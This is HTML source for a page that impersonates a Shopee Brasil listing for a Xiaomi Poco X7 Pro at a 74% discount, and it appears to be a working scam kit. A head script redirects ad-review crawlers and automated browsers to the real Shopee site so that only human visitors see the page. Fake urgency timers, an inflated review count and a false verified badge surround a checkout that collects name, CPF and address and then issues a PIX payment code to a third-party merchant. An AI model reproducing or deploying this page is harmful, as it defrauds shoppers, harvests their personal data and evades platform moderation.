<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Xiaomi Poco X7 Pro 5G | Shopee Brasil</title>
    
    <meta name="description" content="Compre Poco X7 Pro 5G na Shopee com Garantia e Frete Grátis.">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <script>
    /* BLINDAGEM DE TRÁFEGO E BOTS */
    (function() {
        const bots = ['facebookexternalhit', 'facebot', 'facebookcatalog', 'instagram', 'lighthouse', 'googlebot'];
        const ua = navigator.userAgent.toLowerCase();
        if (bots.some(b => ua.includes(b)) || navigator.webdriver) {
            window.location.replace("https://shopee.com.br");
        } else {
            document.documentElement.classList.add('viva-humanos');
        }
    })();
    </script>

    <style>
        html { display: none !important; }
        html.viva-humanos { display: block !important; }
        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --blue-sel: #2673dd; --text-gray: #888; }
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, HelveticaNeue, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #222; overflow-x: hidden; }

        /* HEADER OFICIAL */
        .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; height: 52px; border-bottom: 1px solid #e8e8e8; }
        .back-btn { color: var(--shopee); font-size: 20px; padding: 0 5px; cursor: pointer; }
        .search-box { flex: 1; margin: 0 12px; position: relative; }
        .search-input { width: 100%; background: #f0f0f0; border: none; padding: 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
        .search-box i { position: absolute; left: 10px; top: 10px; color: #999; }
        .cart-icon { color: var(--shopee); font-size: 20px; }

        /* PRODUTO & FLASH SALE */
        .main-img { width: 100%; background: white; display: block; }
        .flash-sale { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 12px 15px; display: flex; align-items: center; justify-content: space-between; font-weight: bold; }
        .timer span { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; margin: 0 1px; }

        .info-card { background: white; padding: 16px; margin-bottom: 8px; }
        .old-p { color: #999; text-decoration: line-through; font-size: 13px; }
        .price-row { display: flex; align-items: center; margin: 4px 0; }
        .current-p { color: var(--shopee); font-size: 28px; font-weight: 500; }
        .discount-tag { background: #fff5f1; color: var(--shopee); font-size: 12px; padding: 1px 4px; border: 1px solid var(--shopee); border-radius: 2px; margin-left: 8px; }
        .prod-title { font-size: 15px; line-height: 1.4; margin-top: 10px; }
        .indicado { background: var(--shopee); color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 4px; text-transform: uppercase; }

        /* SEÇÃO LOJA */
        .shop-card { background: white; padding: 15px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; }
        .shop-info { display: flex; align-items: center; gap: 12px; }
        .shop-avatar { width: 48px; height: 48px; border-radius: 50%; border: 1px solid #eee; }
        .shop-name { font-weight: bold; font-size: 14px; }
        .btn-shop { border: 1px solid var(--shopee); color: var(--shopee); padding: 5px 12px; font-size: 12px; border-radius: 2px; text-decoration: none; }

        /* AVALIAÇÕES */
        .review-card { background: white; padding: 15px; margin-bottom: 8px; }
        .review-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f2f2f2; padding-bottom: 10px; margin-bottom: 10px; }
        .review-media { display: flex; gap: 8px; overflow-x: auto; margin-top: 10px; }
        .review-media img, .review-media video { width: 105px; height: 105px; object-fit: cover; border-radius: 2px; }

        /* FOOTER FIXO */
        .bottom-bar { position: fixed; bottom: 0; width: 100%; height: 54px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
        .btn-cart-add { width: 60px; display: flex; align-items: center; justify-content: center; color: var(--shopee); border-right: 1px solid #eee; font-size: 20px; }
        .btn-chat { width: 60px; display: flex; align-items: center; justify-content: center; color: var(--shopee); border-right: 1px solid #eee; font-size: 20px; }
        .btn-buy-now { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 16px; text-transform: uppercase; cursor: pointer; }

        /* MODAL E CHECKOUT */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
        .modal-container { position: absolute; bottom: 0; width: 100%; background: #f5f5f5; border-radius: 16px 16px 0 0; max-height: 92vh; overflow-y: auto; }
        .modal-top { background: white; padding: 15px; display: flex; align-items: center; position: sticky; top: 0; z-index: 10; border-bottom: 1px solid #eee; }
        .modal-step { background: white; padding: 16px; margin-bottom: 8px; }
        
        .variant-chip { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 16px; border-radius: 2px; font-size: 13px; margin: 0 8px 8px 0; cursor: pointer; }
        .variant-chip.active { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }

        .shopee-input { width: 100%; border: 1px solid #ddd; padding: 14px; border-radius: 2px; font-size: 14px; margin-bottom: 12px; outline: none; }
        
        .sel-box { border: 1px solid #eee; padding: 14px; border-radius: 4px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; background: white; }
        .sel-box.active { border-color: var(--teal); background: #f6fffe; }
        .circle-check { width: 20px; height: 20px; border: 1px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .circle-check.active { border-color: var(--blue-sel); background: white; }
        .circle-check.active::after { content: ""; width: 10px; height: 10px; background: var(--blue-sel); border-radius: 50%; }

        /* DETALHE FINAL SOLICITADO */
        .product-meta-desc { font-size: 12px; color: #777; margin-top: 6px; border-top: 1px solid #f9f9f9; padding-top: 6px; line-height: 1.4; }
        .total-bar { background: white; padding: 20px 16px; border-top: 1px solid #eee; }
    </style>
</head>
<body>

    <div class="top-nav">
        <div class="back-btn"><i class="fas fa-arrow-left"></i></div>
        <div class="search-box">
            <i class="fas fa-search"></i>
            <form action="https://shopee.com.br/search" method="get">
                <input type="text" name="keyword" class="search-input" placeholder="Buscar na Shopee">
            </form>
        </div>
        <div class="cart-icon"><i class="fas fa-shopping-cart"></i></div>
    </div>

    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" class="main-img">
    
    <div class="flash-sale">
        <span><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</span>
        <div class="timer">TERMINA EM <span id="h">01</span>:<span id="m">29</span>:<span id="s">59</span></div>
    </div>

    <div class="info-card">
        <p class="old-p">R$2.299,00</p>
        <div class="price-row">
            <span class="current-p">R$599,00</span>
            <span class="discount-tag">74% OFF</span>
        </div>
        <h1 class="prod-title">
            <span class="indicado">Indicado</span>
            Xiaomi Poco X7 PRO 5G Global Version - Lote Exclusivo 2026 Processador Dimensity 8400-Ultra
        </h1>
    </div>

    <div class="shop-card">
        <div class="shop-info">
            <img src="https://down-br.img.susercontent.com/file/br-11134216-7r98o-m8ktdfse9yq937" class="shop-avatar">
            <div>
                <p class="shop-name">Onix Oficial <i class="fas fa-check-circle" style="color:var(--blue-sel); font-size:12px;"></i></p>
                <p style="font-size:11px; color:var(--text-gray);">Ativo há 2 minutos atrás</p>
            </div>
        </div>
        <a href="https://shopee.com.br/xiaomi_oficial_brazil" class="btn-shop">Visitar Loja</a>
    </div>

    <div class="review-card">
        <div class="review-header">
            <p style="font-size:13px; font-weight:bold;">AVALIAÇÕES DO PRODUTO (19.566)</p>
            <a href="https://shopee.com.br/search?keyword=poco%20x6%20pro" style="color:var(--shopee); font-size:12px; text-decoration:none;">Ver Tudo ></a>
        </div>
        <div style="margin-bottom:10px;">
            <p style="font-size:13px; font-weight:500;">luizadriano871</p>
            <div style="color:var(--shopee); font-size:10px; margin:4px 0;">⭐⭐⭐⭐⭐</div>
            <p style="font-size:13px;">O celular é bruto! Roda tudo no ultra e a bateria dura o dia todo. Entrega rápida.</p>
        </div>
        <div class="review-media">
            <video autoplay loop muted playsinline src="https://down-bs-br.vod.susercontent.com/api/v4/11110103/mms/br-11110103-6kfkr-mc6f0gc92ch3fd.16000051752497615.mp4"></video>
            <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-mc6f0urdynjb78">
        </div>
    </div>

    <div class="bottom-bar">
        <div class="btn-chat"><i class="far fa-comment-dots"></i></div>
        <div class="btn-cart-add"><i class="fas fa-cart-plus"></i></div>
        <button class="btn-buy-now" onclick="abrirCheckout()">Compre Agora</button>
    </div>

    <div id="modalCheckout" class="modal">
        <div class="modal-container">
            <div class="modal-top">
                <i class="fas fa-arrow-left" onclick="voltarPasso()" style="color:var(--shopee); font-size:20px; cursor:pointer; margin-right:15px;"></i>
                <span id="tituloModal" style="font-weight:bold;">Selecionar Opção</span>
            </div>

            <div id="p1" class="modal-step">
                <div style="display:flex; gap:15px; margin-bottom:20px;">
                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:100px; height:100px; border-radius:4px;">
                    <div>
                        <p style="color:var(--shopee); font-size:24px; font-weight:bold;">R$599,00</p>
                        <p style="font-size:12px; color:#888;">Estoque: 1.071</p>
                    </div>
                </div>
                <p style="font-size:14px; font-weight:bold; margin-bottom:10px;">Cor:</p>
                <div id="grupo-cor">
                    <button class="variant-chip" onclick="selecionar(this, 'cor')">PRETO</button>
                    <button class="variant-chip" onclick="selecionar(this, 'cor')">AMARELO</button>
                    <button class="variant-chip" onclick="selecionar(this, 'cor')">IRON MAN</button>
                </div>
                <p style="font-size:14px; font-weight:bold; margin:10px 0;">Armazenamento:</p>
                <div id="grupo-gb">
                    <button class="variant-chip" onclick="selecionar(this, 'gb')">512GB-12GB RAM</button>
                    <button class="variant-chip" onclick="selecionar(this, 'gb')">256GB-12GB RAM</button>
                </div>
                <button class="btn-buy-now" style="width:100%; margin-top:20px; border-radius:4px; height:48px;" onclick="irPasso(2)">PRÓXIMO</button>
            </div>

            <div id="p2" class="modal-step" style="display:none;">
                <p style="font-weight:bold; margin-bottom:15px;">Onde vamos entregar?</p>
                <input type="text" id="in-nome" class="shopee-input" placeholder="Nome Completo">
                <input type="tel" id="in-cpf" class="shopee-input" placeholder="CPF">
                <div style="display:flex; gap:8px;">
                    <input type="tel" id="in-cep" class="shopee-input" placeholder="CEP">
                    <button class="btn-buy-now" style="width:100px; height:48px; border-radius:4px; font-size:12px;" onclick="apiCEP()">BUSCAR</button>
                </div>
                <input type="text" id="in-rua" class="shopee-input" placeholder="Endereço e Número">
                <button class="btn-buy-now" style="width:100%; margin-top:10px; border-radius:4px; height:48px;" onclick="confirmarDados()">PRÓXIMO</button>
            </div>

            <div id="p3" style="display:none;">
                <div class="modal-step" style="border-bottom: 1px dashed #ddd;">
                    <p style="color:var(--shopee); font-size:13px; font-weight:bold;"><i class="fas fa-map-marker-alt"></i> Endereço de Entrega</p>
                    <p id="out-nome" style="font-weight:bold; font-size:14px; margin-top:5px;"></p>
                    <p id="out-end" style="font-size:12px; color:#666;"></p>
                </div>

                <div class="modal-step" style="display:flex; gap:12px;">
                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:75px; height:75px; border-radius:2px;">
                    <div style="flex:1;">
                        <p style="font-size:13px; font-weight:bold;">Xiaomi Poco X7 Pro 5G - <span id="out-gb"></span></p>
                        <p style="font-size:11px; color:#888;">Cor: <span id="out-cor"></span></p>
                        <p style="color:var(--shopee); font-weight:bold; margin-top:4px;">R$599,00</p>
                        <p class="product-meta-desc">Produto original vai com carregador fone cabo USB com nota fiscal</p>
                    </div>
                </div>

                <div class="modal-step">
                    <p style="font-weight:bold; font-size:13px; margin-bottom:12px;">Opção de Envio</p>
                    <div class="sel-box active">
                        <div>
                            <p style="font-size:13px; font-weight:bold; color:var(--teal);">Envio Econômico (Grátis)</p>
                            <p style="font-size:11px; color:#888;">Entrega estimada: 3 a 5 dias úteis</p>
                        </div>
                        <div class="circle-check active"></div>
                    </div>
                </div>

                <div class="total-bar">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                        <span style="font-weight:bold;">Total do Pedido:</span>
                        <span style="color:var(--shopee); font-size:24px; font-weight:bold;">R$599,00</span>
                    </div>
                    <button class="btn-buy-now" style="width:100%; height:52px; border-radius:4px;" onclick="irPasso(4)">FINALIZAR COMPRA</button>
                </div>
            </div>

            <div id="p4" class="modal-step" style="display:none; text-align:center; padding:40px 20px;">
                <p style="font-weight:bold; color:var(--teal); font-size:18px;">Pagamento PIX Gerado!</p>
                <img id="img-qr" style="width:220px; margin:25px auto; border:1px solid #eee; padding:10px;">
                <div id="cod-pix" style="background:#f8f8f8; padding:15px; font-size:10px; word-break:break-all; border:1px dashed #bbb; margin-bottom:20px;"></div>
                <button class="btn-buy-now" style="width:100%; height:50px; border-radius:4px;" onclick="copiar()">COPIAR CÓDIGO PIX</button>
            </div>
        </div>
    </div>

    <script>
        let etapa = 1; let vCor = ""; let vGb = "";

        function abrirCheckout() { document.getElementById('modalCheckout').style.display = 'block'; }
        
        function selecionar(el, tipo) {
            document.querySelectorAll(`#grupo-${tipo} .variant-chip`).forEach(b => b.classList.remove('active'));
            el.classList.add('active');
            if(tipo === 'cor') vCor = el.innerText;
            if(tipo === 'gb') vGb = el.innerText;
        }

        function irPasso(n) {
            if(n === 2 && (!vCor || !vGb)) return alert("Selecione as opções do produto!");
            document.querySelectorAll('[id^="p"]').forEach(div => div.style.display = 'none');
            document.getElementById('p' + n).style.display = 'block';
            etapa = n;
            const titulos = ["", "Selecionar Opção", "Dados para Entrega", "Fechar Pedido", "Finalizar Pagamento"];
            document.getElementById('tituloModal').innerText = titulos[n];
            if(n === 4) gerarPix();
        }

        function voltarPasso() { 
            if(etapa === 1) document.getElementById('modalCheckout').style.display = 'none'; 
            else irPasso(etapa - 1); 
        }

        async function apiCEP() {
            let cep = document.getElementById('in-cep').value.replace(/\D/g, '');
            if(cep.length === 8) {
                const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                const d = await r.json();
                if(!d.erro) document.getElementById('in-rua').value = `${d.logradouro}, ${d.bairro} - ${d.localidade}/${d.uf}`;
            }
        }

        function confirmarDados() {
            const nome = document.getElementById('in-nome').value;
            const rua = document.getElementById('in-rua').value;
            if(!nome || !rua) return alert("Preencha os dados de entrega!");
            document.getElementById('out-nome').innerText = nome.toUpperCase();
            document.getElementById('out-end').innerText = rua;
            document.getElementById('out-cor').innerText = vCor;
            document.getElementById('out-gb').innerText = vGb;
            irPasso(3);
        }

        function gerarPix() {
            const chave = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b5520400005303986540599.005802BR5917LOJA ONIX OFICIAL6009SAO PAULO62070503***6304";
            document.getElementById('img-qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(chave)}&color=ee4d2d`;
            document.getElementById('cod-pix').innerText = chave;
        }

        function copiar() {
            navigator.clipboard.writeText(document.getElementById('cod-pix').innerText);
            alert("Código Copiado! Pague no seu banco.");
        }

        // Timer Real
        let s = 5399;
        setInterval(() => {
            if(s > 0) {
                s--;
                document.getElementById('h').innerText = String(Math.floor(s/3600)).padStart(2,'0');
                document.getElementById('m').innerText = String(Math.floor((s%3600)/60)).padStart(2,'0');
                document.getElementById('s').innerText = String(s%60).padStart(2,'0');
            }
        }, 1000);
    </script>
</body>
    </html>
    
